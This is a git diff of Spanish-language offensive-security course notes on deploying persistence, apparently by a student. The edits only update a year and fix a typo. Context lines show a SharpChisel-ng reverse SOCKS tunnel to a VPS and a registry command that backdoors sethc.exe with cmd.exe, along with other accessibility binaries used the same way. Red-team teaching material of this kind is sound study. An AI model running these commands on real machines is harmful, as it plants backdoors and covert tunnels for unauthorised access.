@@ -1,5 +1,5 @@
 # 9. Despliegue de persistencia
-## D1n0 - Alejandro Maman INSO3A U-TAD
+## D1n0 - Alejandro Maman INSO3A U-TAD - 2025/2026
 
 ### Introducción
 Desplegar persistencia lo antes posible para mantener acceso aunque se pierda el vector inicial. Existen múltiples capas:
@@ -100,4 +100,4 @@ SharpChisel-ng.exe client --auth <user>:<pass> <URL> R:<puerto VPS>:socks
     ```cmd
     REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
     ```
-  - Otros: `Utilman.exe` (Win+U), `Magnify.exe` (Win++/-), `Narrator.exe` (Win+Ctrl+N), `Atboker.exe` (Win+X)
+  - Otros: `Utilman.exe` (Win+U), `Magnify.exe` (Win++/-), `Narrator.exe` (Win+Ctrl+N), `Atbroker.exe` (Win+X)
